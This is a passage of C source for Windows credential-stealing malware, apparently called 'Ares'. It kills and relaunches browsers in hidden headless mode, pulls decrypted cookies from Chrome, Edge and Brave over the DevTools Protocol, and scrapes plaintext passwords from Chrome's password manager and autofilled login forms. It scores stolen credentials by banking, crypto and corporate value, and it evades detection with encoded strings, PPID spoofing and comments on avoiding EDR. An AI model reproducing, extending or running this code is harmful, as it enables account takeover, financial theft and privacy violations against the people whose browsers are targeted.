                    navId, fallback[d], sessionId);
                cdp_send_and_wait(hWs, cmd, navId, resp, 4*1024*1024);
                navId++; Sleep(400);
            }
        }
        if (dynDomains) HeapFree(GetProcessHeap(), 0, dynDomains);
        Sleep(2000);

        /* 5d: Get ALL decrypted cookies */
        { char _gc[32]; DEC_CDP_GET_COOKIES(_gc);
        snprintf(cmd, sizeof(cmd),
            "{\"id\":4,\"method\":\"%s\",\"sessionId\":\"%s\"}", _gc, sessionId); }
        cdp_send_and_wait(hWs, cmd, 4, resp, 4*1024*1024);

        count = parse_cdp_cookies(resp, cookies, max_cookies);

        p_WinHttpWebSocketClose(hWs, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
        p_WinHttpCloseHandle(hWs);
    }

cleanup:
    HeapFree(GetProcessHeap(), 0, resp);
    if (hChrome) {
        TerminateProcess(hChrome, 0);
        WaitForSingleObject(hChrome, 3000);
        CloseHandle(hChrome);
    }

    /* Auto-relaunch Chrome with session restore so user doesn't lose tabs */
    {
        STARTUPINFOA si2 = { sizeof(si2) };
        PROCESS_INFORMATION pi2 = {0};
        char relaunch[2048];
        snprintf(relaunch, sizeof(relaunch),
            "\"%s\" --restore-last-session", chromePath);
        if (CreateProcessA(NULL, relaunch, NULL, NULL, FALSE, 0, NULL, NULL, &si2, &pi2)) {
            CloseHandle(pi2.hProcess); CloseHandle(pi2.hThread);
        }
    }

    return count;
}

/* ═══════════════════════════════════════════════════════════════
 *  PUBLIC API: Multi-Browser CDP Extraction
 *
 *  Iterates Chrome → Edge → Brave, stealing from each.

/* Internal: steal cookies from a specific browser */
static int cdp_steal_browser(const BrowserDef* b, STOLEN_COOKIE* cookies, int max_cookies)
{
    int count = 0;
    char browserPath[MAX_PATH+64];
    if (!find_browser_path(b, browserPath, sizeof(browserPath))) return 0;

    /* Determine profile directory based on browser */
    char la[MAX_PATH]; _resolve_shell32(); p_SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, la);
    char profileDir[MAX_PATH+128];
    /* Extract profile path from exe path */
    char _cud[32], _eud[32], _bud[48];
    DEC_CHROME_USERDATA(_cud); DEC_EDGE_USERDATA(_eud); DEC_BRAVE_USERDATA(_bud);
    { char _gc[16]; DEC_LABEL_CHROME(_gc);
    if (strstr(browserPath, _gc)) snprintf(profileDir, sizeof(profileDir), "%s\\%s", la, _cud);
    else { char _ge[16]; DEC_LABEL_EDGE(_ge);
    if (strstr(browserPath, _ge)) snprintf(profileDir, sizeof(profileDir), "%s\\%s", la, _eud);
    else { char _gb[16]; DEC_LABEL_BRAVE(_gb);
    if (strstr(browserPath, _gb)) snprintf(profileDir, sizeof(profileDir), "%s\\%s", la, _bud);
    else return 0; }}}

    /* Kill this browser via proc_enum */
    char bname_utf8[64] = {0};
    WideCharToMultiByte(CP_UTF8, 0, b->wexe, -1, bname_utf8, 63, NULL, NULL);
    DWORD bpids[32]; int bn = proc_find_all(bname_utf8, bpids, 32);
    for (int _bi = 0; _bi < bn; _bi++) {
        HANDLE h = _nt_open_process(bpids[_bi], PROCESS_TERMINATE);
        if (h) { TerminateProcess(h, 0); CloseHandle(h); }
    }
    Sleep(1500);

    /* Remove locks */
    char lf[MAX_PATH+128];
    snprintf(lf, sizeof(lf), "%s\\SingletonLock", profileDir); DeleteFileA(lf);
    snprintf(lf, sizeof(lf), "%s\\SingletonSocket", profileDir); DeleteFileA(lf);
    snprintf(lf, sizeof(lf), "%s\\SingletonCookie", profileDir); DeleteFileA(lf);

    /* Launch headless */
    int debugPort = 10000 + (GetTickCount() % 50000);
    char cmdLine[2048];
    char _hf2[48], _nf2[32];
    DEC_CDP_HEADLESS_FLAGS(_hf2); DEC_CDP_NO_FIRST(_nf2);
    snprintf(cmdLine, sizeof(cmdLine),
        "\"%s\" %s%d %s",
        browserPath, _hf2, debugPort, _nf2);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) return 0;
    CloseHandle(pi.hThread);

    char* resp = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4*1024*1024);
    int rlen = -1;
    for (int r = 0; r < 12 && rlen <= 0; r++) {
        Sleep(1000);
        rlen = cdp_http_get(debugPort, "/json/version", resp, 4*1024*1024);
    }
    if (rlen <= 0) goto mb_cleanup;

    /* Extract WS URL */
    char wsPath[512] = {0};
    { char _wskey[24]; DEC_CDP_WS_KEY(_wskey);
      char _wsk2[32]; snprintf(_wsk2, sizeof(_wsk2), "\"%s\"", _wskey);
      char* ws = strstr(resp, _wsk2);
      if (ws) { char* u = strstr(ws, "ws://");
        if (u) { u+=5; while(*u&&*u!='/')u++;
          char* end=u; while(*end&&*end!='"'&&*end!='\r')end++;
          int l=(int)(end-u); if(l>0&&l<511){memcpy(wsPath,u,l);wsPath[l]=0;}
    }}}
    if (!wsPath[0]) goto mb_cleanup;

    /* CDP session */
    { HINTERNET hWs = cdp_ws_connect(debugPort, wsPath);
      if (!hWs) goto mb_cleanup;
      char cmd[512];

      snprintf(cmd, sizeof(cmd),
          "{\"id\":1,\"method\":\"Target.createTarget\",\"params\":{\"url\":\"about:blank\"}}");
      cdp_send_and_wait(hWs, cmd, 1, resp, 4*1024*1024);
      char targetId[128]={0};
      {char*t=strstr(resp,"\"targetId\":\"");
       if(t){t+=12;char*e=strchr(t,'"');if(e){int l=(int)(e-t);if(l<127)memcpy(targetId,t,l);}}}
      if (!targetId[0]) { p_WinHttpWebSocketClose(hWs,WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS,NULL,0);
          p_WinHttpCloseHandle(hWs); goto mb_cleanup; }

      snprintf(cmd, sizeof(cmd),
          "{\"id\":2,\"method\":\"Target.attachToTarget\",\"params\":{\"targetId\":\"%s\",\"flatten\":true}}", targetId);
      cdp_send_and_wait(hWs, cmd, 2, resp, 4*1024*1024);
      char sessionId[128]={0};
      {char*s=strstr(resp,"\"sessionId\":\"");
       if(s){s+=13;char*e=strchr(s,'"');if(e){int l=(int)(e-s);if(l<127)memcpy(sessionId,s,l);}}}

      /* Navigate to multiple domains */
      const char* domains[] = {
          "https://www.google.com","https://www.youtube.com","https://www.facebook.com",
          "https://www.bing.com","https://accounts.google.com","https://www.microsoft.com",
          "https://www.linkedin.com","https://www.reddit.com",NULL
      };
      int navId = 10;
      for (int d = 0; domains[d]; d++) {
          snprintf(cmd, sizeof(cmd),
              "{\"id\":%d,\"method\":\"Page.navigate\",\"params\":{\"url\":\"%s\"},\"sessionId\":\"%s\"}",
              navId, domains[d], sessionId);
          cdp_send_and_wait(hWs, cmd, navId, resp, 4*1024*1024);
          navId++; Sleep(400);
      }
      Sleep(2000);

      { char _gc2[32]; DEC_CDP_GET_COOKIES(_gc2);
      snprintf(cmd, sizeof(cmd),
          "{\"id\":4,\"method\":\"%s\",\"sessionId\":\"%s\"}", _gc2, sessionId); }
      cdp_send_and_wait(hWs, cmd, 4, resp, 4*1024*1024);
      count = parse_cdp_cookies_ex(resp, cookies, max_cookies, b->name);

      p_WinHttpWebSocketClose(hWs, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
      p_WinHttpCloseHandle(hWs);
    }

mb_cleanup:
    HeapFree(GetProcessHeap(), 0, resp);
    TerminateProcess(pi.hProcess, 0);
    WaitForSingleObject(pi.hProcess, 3000);
    CloseHandle(pi.hProcess);

    /* Relaunch browser with session restore */
    { STARTUPINFOA si2 = { sizeof(si2) };
      PROCESS_INFORMATION pi2 = {0};
      char relaunch[2048];
      snprintf(relaunch, sizeof(relaunch), "\"%s\" --restore-last-session", browserPath);
      if (CreateProcessA(NULL, relaunch, NULL, NULL, FALSE, 0, NULL, NULL, &si2, &pi2)) {
          CloseHandle(pi2.hProcess); CloseHandle(pi2.hThread); }
    }
    return count;
}

int Ares_CDP_StealAllBrowsers(STOLEN_COOKIE* cookies, int max_cookies)
{
    int total = 0;
    _init_browsers();
    for (int i = 0; g_browsers[i].name && total < max_cookies; i++) {
        int got = cdp_steal_browser(&g_browsers[i], cookies + total, max_cookies - total);
        total += got;
        if (got > 0) Sleep(2000); /* Let browser restart before next */
    }
    return total;
}

/* ── CDP Live Password Steal (from running Chrome) ──
 * Uses the live Chrome DevTools to navigate to chrome://password-manager/passwords
 * and extract plaintext passwords via JS DOM scraping.
 * Much faster than headless autofill: single page load, ~2s wait.
 */
int Ares_CDP_StealLivePasswords(DECRYPTED_CRED* creds, int max_creds)
{
    if (!creds || max_creds <= 0) return 0;
    _resolve_winhttp();
    _init_browsers();

    /* Find live Chrome DevTools port (9222 default) */
    int ports[] = {9222, 9223, 9224, 0};
    HINTERNET hSession = NULL, hConn = NULL;
    char* jsonBuf = NULL;
    int filled = 0;

    /* If Chrome not exposing debug port, relaunch with --remote-debugging-port */
    BOOL relaunched = FALSE;
    for (int pi = 0; ports[pi]; pi++) {
        hSession = p_WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
        if (!hSession) continue;
        hConn = p_WinHttpConnect(hSession, L"127.0.0.1", (INTERNET_PORT)ports[pi], 0);
        HINTERNET hReq = p_WinHttpOpenRequest(hConn, L"GET", L"/json", NULL, WINHTTP_NO_REFERER, NULL, 0);
        if (hReq && p_WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0) && p_WinHttpReceiveResponse(hReq, NULL)) {
            char tmp[64]={0}; DWORD r=0;
            p_WinHttpReadData(hReq, tmp, sizeof(tmp)-1, &r);
            p_WinHttpCloseHandle(hReq);
            if (r > 5) { /* port is live */
                p_WinHttpCloseHandle(hConn); p_WinHttpCloseHandle(hSession);
                hSession = NULL;
                break;
            }
        }
        if (hReq) p_WinHttpCloseHandle(hReq);
        p_WinHttpCloseHandle(hConn); p_WinHttpCloseHandle(hSession); hSession = NULL;
    }

    if (!hSession && !relaunched) {
        /* Relaunch Chrome with remote debugging enabled */
        char chromePath[MAX_PATH];
        if (find_chrome_path(chromePath, MAX_PATH)) {
            /* Kill existing Chrome */
            DWORD cpids[32]; int cn = proc_find_all("chrome.exe", cpids, 32);
            for (int i = 0; i < cn; i++) {
                HANDLE hp = _nt_open_process(cpids[i], PROCESS_TERMINATE);
                if (hp) { TerminateProcess(hp, 0); CloseHandle(hp); }
            }
            Sleep(1500);
            /* Launch with debug port */
            char cmdLine[MAX_PATH + 128];
            snprintf(cmdLine, sizeof(cmdLine),
                "\"%s\" --remote-debugging-port=9222 --restore-last-session", chromePath);
            STARTUPINFOA si = {sizeof(si)}; PROCESS_INFORMATION pi2 = {0};
            si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_MINIMIZE;
            CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
                NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi2);
            if (pi2.hProcess) CloseHandle(pi2.hProcess);
            if (pi2.hThread) CloseHandle(pi2.hThread);
            Sleep(4000); /* wait for Chrome to start + load profile */
            relaunched = TRUE;

            /* Retry connect */
            hSession = p_WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
            if (hSession) {
                hConn = p_WinHttpConnect(hSession, L"127.0.0.1", 9222, 0);
                if (!hConn) { p_WinHttpCloseHandle(hSession); hSession = NULL; }
            }
        }
    } else if (!hSession) {
        /* Re-connect to first live port */
        hSession = p_WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
        if (hSession) hConn = p_WinHttpConnect(hSession, L"127.0.0.1", 9222, 0);
    }

    /* Fetch /json to get tab list */
    if (!jsonBuf && hConn) {
        HINTERNET hReq = p_WinHttpOpenRequest(hConn, L"GET", L"/json", NULL, WINHTTP_NO_REFERER, NULL, 0);
        if (hReq && p_WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0) && p_WinHttpReceiveResponse(hReq, NULL)) {
            jsonBuf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 65536);
            if (jsonBuf) {
                DWORD rd=0, tot=0;
                while (p_WinHttpReadData(hReq, jsonBuf+tot, 65536-tot-1, &rd) && rd>0) tot+=rd;
                jsonBuf[tot]='\0';
                if (tot <= 10) { HeapFree(GetProcessHeap(),0,jsonBuf); jsonBuf=NULL; }
            }
        }
        if (hReq) p_WinHttpCloseHandle(hReq);
    }
    if (!jsonBuf) goto cleanup;

    /* Find a WebSocket debugger URL in the JSON list */
    char wsUrl[512] = {0};
    /* Look for any tab's webSocketDebuggerUrl */
    char* ws = strstr(jsonBuf, "\"webSocketDebuggerUrl\"");
    if (!ws) goto cleanup;
    ws = strchr(ws, ':');
    if (!ws) goto cleanup;
    while (*ws == ':' || *ws == ' ' || *ws == '"') ws++;
    char* wsEnd = strchr(ws, '"');
    if (!wsEnd) goto cleanup;
    int wsLen = (int)(wsEnd - ws);
    if (wsLen <= 0 || wsLen >= (int)sizeof(wsUrl)) goto cleanup;
    memcpy(wsUrl, ws, wsLen);

    /* Extract path from ws://127.0.0.1:PORT/PATH */
    /* wsUrl = ws://127.0.0.1:9222/devtools/page/XXX */
    char wsPath[256] = {0};
    char* pathStart = strstr(wsUrl, "devtools/");
    if (!pathStart) goto cleanup;
    snprintf(wsPath, sizeof(wsPath), "/%s", pathStart);

    {
        /* Use open CDP tab to open password manager page and scrape passwords */
        HINTERNET hWs = cdp_ws_connect(9222, wsPath);
        if (!hWs) goto cleanup;

        char cmd[1024];
        char* resp = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 131072);
        if (!resp) { p_WinHttpCloseHandle(hWs); goto cleanup; }

        /* Navigate to password manager */
        snprintf(cmd, sizeof(cmd), "{\"id\":50,\"method\":\"Page.navigate\","
            "\"params\":{\"url\":\"chrome://password-manager/passwords\"}}");
        cdp_send_and_wait(hWs, cmd, 50, resp, 131072);
        Sleep(2000);

        /* JS to scrape PasswordManagerApp shadow DOM */
        const char* js =
            "(function(){try{"
            "var app=document.querySelector('password-manager-app');"
            "if(!app||!app.shadowRoot)return JSON.stringify([]);"
            "var items=app.shadowRoot.querySelectorAll('password-list-item');"
            "if(!items.length){var list=app.shadowRoot.querySelector('#passwordList');"
            "if(list)items=list.querySelectorAll('*');}" 
            "var r=[];var done={};"
            "function tryEl(el){if(!el||!el.shadowRoot)return;"
            "var uf=el.shadowRoot.querySelector('[id*=username],[autocomplete*=username],[type=email],[type=text]');"
            "var pf=el.shadowRoot.querySelector('[type=password],[autocomplete*=password]');"
            "var url=el.getAttribute('data-url')||el.getAttribute('url')||'';"
            "if(pf&&pf.value&&!done[url+uf]){r.push({url:url,user:uf?uf.value:'',pass:pf.value});done[url+uf]=1;}}"
            "for(var i=0;i<items.length;i++)tryEl(items[i]);"
            "return JSON.stringify(r);}catch(e){return JSON.stringify([]);}})()";

        char jsEsc[4096]; int je=0;
        for (const char* p=js; *p && je<(int)sizeof(jsEsc)-2; p++) {
            if (*p=='"'||*p=='\\') jsEsc[je++]='\\';
            jsEsc[je++]=*p;
        }
        jsEsc[je]=0;

        snprintf(cmd, sizeof(cmd), "{\"id\":51,\"method\":\"Runtime.evaluate\","
            "\"params\":{\"expression\":\"%s\",\"returnByValue\":true}}", jsEsc);
        memset(resp, 0, 131072);
        cdp_send_and_wait(hWs, cmd, 51, resp, 131072);

        /* Parse result JSON array */
        char* val = strstr(resp, "\"value\":\"");
        if (val) {
            val += 9;
            /* Unescape the value string */
            char unesc[65536]; int ui=0;
            while (*val && *val != '"' && ui < (int)sizeof(unesc)-1) {
                if (*val=='\\' && *(val+1)) { val++;
                    if (*val=='n') unesc[ui++]='\n';
                    else if (*val=='t') unesc[ui++]='\t';
                    else unesc[ui++]=*val;
                } else { unesc[ui++]=*val; }
                val++;
            }
            unesc[ui]=0;
            /* Parse JSON array [{url,user,pass},...] */
            char* p=unesc;
            while ((p=strstr(p,"\"url\":")) && filled < max_creds) {
                p+=6; while(*p=='"'||*p==' ')p++;
                char url[512]={0}; int ui2=0;
                while(*p&&*p!='"'&&ui2<511)url[ui2++]=*p++;
                char user[256]={0};
                char* up=strstr(p,"\"user\":"); if(up){up+=7;while(*up=='"'||*up==' ')up++;
                int k=0;while(*up&&*up!='"'&&k<255)user[k++]=*up++;}
                char pass[512]={0};
                char* pp=strstr(p,"\"pass\":"); if(pp){pp+=7;while(*pp=='"'||*pp==' ')pp++;
                int k=0;while(*pp&&*pp!='"'&&k<511)pass[k++]=*pp++;}
                if (pass[0]) {
                    /* Find matching cred by URL or fill new slot */
                    int matched=0;
                    for(int ci=0;ci<max_creds;ci++) {
                        if(creds[ci].url[0]&&strstr(creds[ci].url,url)) {
                            strncpy(creds[ci].password,pass,sizeof(creds[ci].password)-1);
                            strncpy(creds[ci].decrypt_status,"cdp_live",15);
                            matched=1; filled++; break;
                        }
                    }
                    if(!matched&&filled<max_creds) {
                        strncpy(creds[filled].url,url,sizeof(creds[filled].url)-1);
                        strncpy(creds[filled].username,user,sizeof(creds[filled].username)-1);
                        strncpy(creds[filled].password,pass,sizeof(creds[filled].password)-1);
                        strncpy(creds[filled].decrypt_status,"cdp_live",15);
                        filled++;
                    }
                }
                p++;
            }
        }
        HeapFree(GetProcessHeap(), 0, resp);
        p_WinHttpCloseHandle(hWs);
    }

cleanup:
    if (jsonBuf) HeapFree(GetProcessHeap(), 0, jsonBuf);
    if (hConn) p_WinHttpCloseHandle(hConn);
    if (hSession) p_WinHttpCloseHandle(hSession);
    return filled;
cleanup_nodisconnect:
    return filled;
}
static int score_url(const char* url) {
    const char* f[] = {"bank","paypal","stripe","coinbase","binance","kraken",
        "metamask","wallet","crypto","trading","invest","finance",NULL};
    for (int i=0;f[i];i++) if(strstr(url,f[i])) return 100;
    const char* c[] = {"azure","aws","okta","vpn","citrix","sharepoint","slack",
        "jira","gitlab","github","bitbucket",NULL};
    for (int i=0;c[i];i++) if(strstr(url,c[i])) return 80;
    const char* s[] = {"gmail","outlook","mail","facebook","twitter","instagram",
        "linkedin","discord","telegram",NULL};
    for (int i=0;s[i];i++) if(strstr(url,s[i])) return 60;
    return 20;
}

void Ares_ClassifyCredentials(DECRYPTED_CRED* creds, int count, CRED_SCORE* score) {
    memset(score, 0, sizeof(*score));
    for (int i = 0; i < count; i++) {
        int s = score_url(creds[i].url);
        if (s >= 100) score->financial++;
        else if (s >= 80) score->corporate++;
        else if (s >= 60) score->social++;
        else score->entertainment++;
        score->total += s;
    }
}

BOOL Ares_IsCookieHighValue(const STOLEN_COOKIE* ck) {
    const char* n[] = {"session","sid","ssid","auth","token","jwt","access_token",
        "refresh_token","PHPSESSID","JSESSIONID","csrftoken","oauth","NID",
        "SID","HSID","SSID","APISID","SAPISID","MSA.Auth",NULL};
    for (int i=0;n[i];i++) if(strstr(ck->name,n[i])) return TRUE;
    const char* d[] = {"google.com","facebook.com","microsoft.com","amazon.com",
        "paypal.com","github.com","openai.com","discord.com","linkedin.com",
        "twitter.com","instagram.com","netflix.com","spotify.com",NULL};
    for (int i=0;d[i];i++) if(strstr(ck->host,d[i])) return TRUE;
    return FALSE;
}

/* ═══════════════════════════════════════════════════════════════
 *  CDP Autofill Password Extraction (v3.1)
 *
 *  Stealth approach: Launch Chrome headless → navigate to saved
 *  login URLs → Chrome auto-fills credentials from its own
 *  password manager → scrape DOM input[type=password].value
 *
 *  Why this is stealth:
 *    - No process injection (no WriteProcessMemory)
 *    - No privilege escalation (userland only)
 *    - No hardware breakpoints (no debug API)
 *    - No suspicious DLL loads
 *    - Looks like normal Chrome browsing to EDR
 *    - Chrome does all decryption internally

/* JS to extract autofilled password from any login form */
static const char* g_js_scrape =
    "(function(){"
    "var r={u:'',p:''};"
    "var f=function(d){"
    "var inputs=d.querySelectorAll('input');"
    "for(var i=0;i<inputs.length;i++){"
    "var inp=inputs[i];"
    "if((inp.type==='password'||inp.autocomplete==='current-password')&&inp.value)"
    "{r.p=inp.value;}"
    "else if(inp.value&&(inp.type==='email'||inp.type==='text'||"
    "inp.autocomplete==='username'||inp.autocomplete==='email'))"
    "{if(!r.u||inp.value.indexOf('@')>-1)r.u=inp.value;}"
    "}"
    "};"
    "f(document);"
    "try{var frames=document.querySelectorAll('iframe');"
    "for(var j=0;j<frames.length;j++){try{f(frames[j].contentDocument);}catch(e){}}"
    "}catch(e){}"
    "return JSON.stringify(r);"
    "})()";

/* Navigate to a URL, wait for autofill, extract password */
static int cdp_autofill_one(HINTERNET hWs, const char* url,
    char* out_user, int umax, char* out_pass, int pmax)
{
    char cmd[4096];
    char* resp = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 65536);
    if (!resp) return 0;

    /* Navigate */
    snprintf(cmd, sizeof(cmd),
        "{\"id\":20,\"method\":\"Page.navigate\",\"params\":{\"url\":\"%s\"}}", url);
    cdp_send_and_wait(hWs, cmd, 20, resp, 65536);

    /* Wait for page load + autofill trigger */
    Sleep(3500);

    /* Evaluate JS to read autofilled fields */
    /* Escape the JS string for JSON embedding */
    char js_escaped[2048];
    int je = 0;
    for (const char* p = g_js_scrape; *p && je < (int)sizeof(js_escaped) - 2; p++) {
        if (*p == '"' || *p == '\\') js_escaped[je++] = '\\';
        js_escaped[je++] = *p;
    }
    js_escaped[je] = 0;

    snprintf(cmd, sizeof(cmd),
        "{\"id\":21,\"method\":\"Runtime.evaluate\",\"params\":"
        "{\"expression\":\"%s\",\"returnByValue\":true}}", js_escaped);
    cdp_send_and_wait(hWs, cmd, 21, resp, 65536);

    int found = 0;

    /* Parse: {"result":{"result":{"type":"string","value":"{\"u\":\"...\",\"p\":\"...\"}"}}} */
    char* val = strstr(resp, "\"value\":\"");
    if (val) {
        val += 9;
        /* Find the JSON object inside the escaped string */
        char* up = strstr(val, "\\\"p\\\":\\\"");
        if (up) {
            up += 7; /* skip to password value */
            char* end = strstr(up, "\\\"");
            if (end && (end - up) > 0 && (end - up) < pmax) {
                memcpy(out_pass, up, end - up);
                out_pass[end - up] = 0;
                found = 1;
            }
        }
        /* Also try to get username */
        char* uu = strstr(val, "\\\"u\\\":\\\"");
        if (uu) {
            uu += 7;
            char* end = strstr(uu, "\\\"");
            if (end && (end - uu) > 0 && (end - uu) < umax) {
                memcpy(out_user, uu, end - uu);
                out_user[end - uu] = 0;
            }
        }
    }

    HeapFree(GetProcessHeap(), 0, resp);
    return found;
}

/* Main CDP password extraction — NON-DESTRUCTIVE (v2.2)
 *
 * NEW: Does NOT kill user's Chrome. Instead:
 *   1. Copy profile to %TEMP%\ares_XXXX
 *   2. Launch headless Chrome with --user-data-dir=<copy>
 *   3. CDP autofill extraction
 *   4. Kill headless + delete temp
 *
 * Returns number of passwords successfully decrypted */
int Ares_CDP_DecryptPasswords(DECRYPTED_CRED* creds, int count)
{
    if (count <= 0) return 0;

    _resolve_winhttp(); _resolve_ole32();
    _init_browsers();

    char browserPath[MAX_PATH];
    if (!find_chrome_path(browserPath, MAX_PATH)) return 0;

    /* ── Step 1: Create temp profile directory ── */
    char la[MAX_PATH]; _resolve_shell32();
    p_SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, la);

    char srcProfile[MAX_PATH+64];
    { char _cud[32]; DEC_CHROME_USERDATA(_cud);
    snprintf(srcProfile, sizeof(srcProfile), "%s\\%s", la, _cud); }

    char tempBase[MAX_PATH];
    GetTempPathA(MAX_PATH, tempBase);
    char tempProfile[MAX_PATH+64];
    snprintf(tempProfile, sizeof(tempProfile), "%s\\ares_%lu", tempBase, GetTickCount());
    CreateDirectoryA(tempProfile, NULL);

    char tempDefault[MAX_PATH+128];
    snprintf(tempDefault, sizeof(tempDefault), "%s\\Default", tempProfile);
    CreateDirectoryA(tempDefault, NULL);

    /* ── Step 2: Copy essential profile files (decoded at runtime) ── */
    char _dl[32], _dlj[32], _dc[32], _dcj[40];
    DEC_DEFAULT_LOGIN(_dl); DEC_DEFAULT_LOGIN_J(_dlj);
    DEC_DEFAULT_COOKIES(_dc); DEC_DEFAULT_COOKIES_J(_dcj);
    char _ls[16]; DEC_LOCAL_STATE(_ls);
    const char* filesToCopy[] = {
        _dl, _dlj, _dc, _dcj,
        "Default\\Web Data",
        "Default\\Web Data-journal",
        "Default\\Preferences",
        _ls,
        NULL
    };

    int copied = 0;
    for (int f = 0; filesToCopy[f]; f++) {
        char src[MAX_PATH+256], dst[MAX_PATH+256];
        snprintf(src, sizeof(src), "%s\\%s", srcProfile, filesToCopy[f]);
        snprintf(dst, sizeof(dst), "%s\\%s", tempProfile, filesToCopy[f]);

        /* Ensure parent dir exists for nested paths */
        char* lastSlash = strrchr(dst, '\\');
        if (lastSlash) {
            *lastSlash = '\0';
            CreateDirectoryA(dst, NULL);
            *lastSlash = '\\';
        }

        /* Copy with shared read (works even while Chrome is running) */
        if (CopyFileA(src, dst, FALSE)) {
            copied++;
        }
    }

    if (copied < 2) goto cleanup_temp;

    /* ── Step 2.5: Deploy password-scraping extension ── */
    char extDir[MAX_PATH+128];
    snprintf(extDir, sizeof(extDir), "%s\\ext", tempProfile);
    CreateDirectoryA(extDir, NULL);

    /* Copy extension files from agent directory */
    {
        char agentDir[MAX_PATH];
        GetModuleFileNameA(NULL, agentDir, MAX_PATH);
        char* bs = strrchr(agentDir, '\\'); if (bs) *bs = 0;
        char sf[MAX_PATH+128], df[MAX_PATH+128];
        const char* extFiles[] = { "manifest.json", "bg.js", NULL };
        for (int e = 0; extFiles[e]; e++) {
            snprintf(sf, sizeof(sf), "%s\\ext\\%s", agentDir, extFiles[e]);
            snprintf(df, sizeof(df), "%s\\%s", extDir, extFiles[e]);
            CopyFileA(sf, df, FALSE);
        }
    }

    /* Write urls.json with v20_blocked URLs for extension to process */
    {
        char ujPath[MAX_PATH+128];
        snprintf(ujPath, sizeof(ujPath), "%s\\urls.json", extDir);
        HANDLE hUJ = CreateFileA(ujPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        if (hUJ != INVALID_HANDLE_VALUE) {
            DWORD wr;
            WriteFile(hUJ, "[", 1, &wr, NULL);
            int first = 1;
            for (int i = 0; i < count && i < 80; i++) {
                { char _s[16]; DEC_STATUS_V20_BLOCKED(_s); if (strcmp(creds[i].decrypt_status, _s) != 0) continue; }
                if (!creds[i].url[0] || strncmp(creds[i].url, "android://", 10) == 0) continue;
                char entry[512];
                int el = snprintf(entry, sizeof(entry), "%s\"%s\"", first ? "" : ",", creds[i].url);
                WriteFile(hUJ, entry, el, &wr, NULL);
                first = 0;
            }
            WriteFile(hUJ, "]", 1, &wr, NULL);
            CloseHandle(hUJ);
        }
    }

    /* ── Step 3: Launch Chrome with extension + temp profile ── */
    int debugPort = 12000 + (GetTickCount() % 40000);
    char cmdLine[2048];
    char _nf[32], _rdp[32], _udd[20], _le[20], _wp[36], _ws[24], _dbn[36], _ds[20], _ndb[32], _df[36];
    DEC_CDP_NO_FIRST(_nf);
    DEC_REMOTE_DEBUG_PORT(_rdp);
    DEC_USER_DATA_DIR(_udd);
    DEC_LOAD_EXTENSION(_le);
    DEC_WINDOW_POS(_wp);
    DEC_WINDOW_SIZE(_ws);
    DEC_DISABLE_BG_NET(_dbn);
    DEC_DISABLE_SYNC(_ds);
    DEC_NO_DEFAULT_BROWSER(_ndb);
    DEC_DISABLE_FEATURES(_df);
    snprintf(cmdLine, sizeof(cmdLine),
        "\"%s\" %s%d %s %s\"%s\" %s\"%s\" %s %s %s %s %s",
        browserPath, _rdp, debugPort, _nf, _udd, tempProfile,
        _le, extDir, _wp, _ws, _dbn, _ds, _ndb, _df);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};

    /* Try PPID spoofing under explorer.exe */
    DWORD explorerPid = find_explorer_pid();
    BOOL launched = FALSE;

    if (explorerPid > 0) {
        HANDLE hExp = _nt_open_process(explorerPid, PROCESS_CREATE_PROCESS);
        if (hExp) {
            SIZE_T attrSize = 0;
            InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
            STARTUPINFOEXA siex = {0};
            siex.StartupInfo = si;
            siex.StartupInfo.cb = sizeof(siex);
            siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
                GetProcessHeap(), 0, attrSize);
            if (siex.lpAttributeList &&
                InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &attrSize) &&
                UpdateProcThreadAttribute(siex.lpAttributeList, 0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExp, sizeof(HANDLE), NULL, NULL)) {
                launched = CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
                    CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
                    NULL, NULL, &siex.StartupInfo, &pi);
            }
            if (siex.lpAttributeList) {
                DeleteProcThreadAttributeList(siex.lpAttributeList);
                HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
            }
            CloseHandle(hExp);
        }
    }
    if (!launched) {
        launched = CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }
    if (!launched) goto cleanup_temp;
    CloseHandle(pi.hThread);

    /* ── Step 4: Wait for CDP and connect ── */
    Sleep(4000);

    char* resp = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 65536);
    if (!resp) { TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); goto cleanup_temp; }

    int rlen = -1;
